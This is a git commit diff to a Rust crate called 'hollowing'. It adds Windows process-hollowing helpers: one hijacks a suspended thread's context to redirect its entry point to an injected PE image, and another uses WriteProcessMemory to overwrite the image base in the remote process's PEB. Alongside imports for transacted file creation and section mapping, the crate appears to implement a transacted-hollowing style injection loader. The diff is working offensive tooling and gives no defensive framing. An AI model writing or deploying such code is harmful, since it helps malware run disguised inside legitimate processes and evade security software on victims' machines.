e0601c71a1568fecc10fb5094342aca5c7de5e94
sqlerrorthing <148702857+sqlerrorthing@users.noreply.github.com>
2025-06-08 16:04:24 +0800

    some new hollwing functions

--- hollowing/src/lib.rs
+++ hollowing/src/lib.rs
@@ -10,11 +10,16 @@ use ntapi::ntmmapi::{NtCreateSection, NtMapViewOfSection, ViewShare};
 use utils::WideString;
 use winapi::um::winbase::{CREATE_NO_WINDOW, DETACHED_PROCESS};
 use windows_sys::core::{PCWSTR, PWSTR};
-use windows_sys::Win32::Foundation::{CloseHandle, BOOL, FALSE, GENERIC_READ, GENERIC_WRITE, HANDLE, INVALID_HANDLE_VALUE, STATUS_IMAGE_NOT_AT_BASE, STATUS_SUCCESS};
+use windows_sys::Win32::Foundation::{CloseHandle, BOOL, FALSE, GENERIC_READ, GENERIC_WRITE, HANDLE, INVALID_HANDLE_VALUE, STATUS_IMAGE_NOT_AT_BASE, STATUS_SUCCESS, TRUE};
 use windows_sys::Win32::Security::SECURITY_ATTRIBUTES;
 use windows_sys::Win32::Storage::FileSystem::{CreateFileTransactedW, CreateFileW, CreateTransaction, GetFileSize, RollbackTransaction, WriteFile, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ, OPEN_EXISTING};
+use windows_sys::Win32::System::Diagnostics::Debug::{SetThreadContext, WriteProcessMemory, IMAGE_NT_HEADERS32, IMAGE_NT_HEADERS64};
 use windows_sys::Win32::System::Memory::{CreateFileMappingW, MapViewOfFile, UnmapViewOfFile, FILE_MAP_READ, PAGE_READONLY, SECTION_ALL_ACCESS, SEC_IMAGE};
+use windows_sys::Win32::System::SystemServices::IMAGE_DOS_HEADER;
 use windows_sys::Win32::System::Threading::{CREATE_SUSPENDED, PROCESS_INFORMATION, STARTUPINFOW};
+
+type PVoid = *const c_void;
+type PByte = *const u8;
 
 macro_rules! module_function {
     (
@@ -45,6 +50,28 @@ macro_rules! module_function {
             }
         }
     };
+}
+
+macro_rules! thread_context {
+    ($thread:expr) => {{
+        use windows_sys::Win32::{
+            Foundation::FALSE,
+            System::Diagnostics::Debug::{GetThreadContext, CONTEXT, WOW64_CONTEXT_INTEGER}
+        };
+
+        let mut context = CONTEXT {
+            ContextFlags: WOW64_CONTEXT_INTEGER,
+            ..unsafe { zeroed() }
+        };
+
+        if unsafe {
+            GetThreadContext($thread, &mut context)
+        } == FALSE {
+            None
+        } else {
+            Some(context)
+        }
+    }};
 }
 
 module_function!(
@@ -300,4 +327,69 @@ where
     }
 
     Some(buffer)
+}
+
+fn update_remove_ep(thread: HANDLE, ep_va: u64) -> bool {
+    let Some(mut context) = thread_context!(thread) else {
+        return false
+    };
+
+    context.Rcx = ep_va;
+
+    unsafe {
+        SetThreadContext(thread, &mut context) == TRUE
+    }
+}
+
+fn get_remote_peb_address(thread: HANDLE) -> Option<u64> {
+    thread_context!(thread).map(|context| context.Rdx)
+}
+
+fn get_ep_rva(pe_buffer: PByte) -> u32 {
+    let payload_dos_hdr = pe_buffer as *mut IMAGE_DOS_HEADER;
+
+    macro_rules! address_of_entry_point {
+        ($ptr:expr, $image:ty) => {{
+            (*($ptr as *mut $image)).OptionalHeader.AddressOfEntryPoint
+        }};
+    }
+
+    unsafe {
+        let e_lfanew = (*payload_dos_hdr).e_lfanew as usize;
+        let ptr = pe_buffer.add(e_lfanew);
+
+        if cfg!(target_arch= "x86_64") {
+            address_of_entry_point!(ptr, IMAGE_NT_HEADERS64)
+        } else {
+            address_of_entry_point!(ptr, IMAGE_NT_HEADERS32)
+        }
+    }
+}
+
+fn redirect_ep(thread: HANDLE, loaded_pe: PByte, loaded_base: PVoid) -> bool {
+    let ep = get_ep_rva(loaded_pe);
+    let ep_va = (loaded_base as usize).wrapping_add(ep as usize) as u64;
+
+    update_remove_ep(thread, ep_va)
+}
+
+fn set_new_image_base(process: HANDLE, thread: HANDLE, loaded_pe: PByte, loaded_base: PVoid) -> bool {
+    let Some(remote_peb_address) = get_remote_peb_address(thread) else {
+        return false
+    };
+
+    let img_base_size = size_of::<u64>();
+    let offset = img_base_size * 2;
+    let remote_img_base = (remote_peb_address as usize).wrapping_add(offset) as PVoid;
+
+    let mut written = 0;
+    unsafe {
+        WriteProcessMemory(
+            process,
+            remote_img_base,
+            loaded_base,
+            img_base_size,
+            &mut written
+        ) == TRUE
+    }
 }
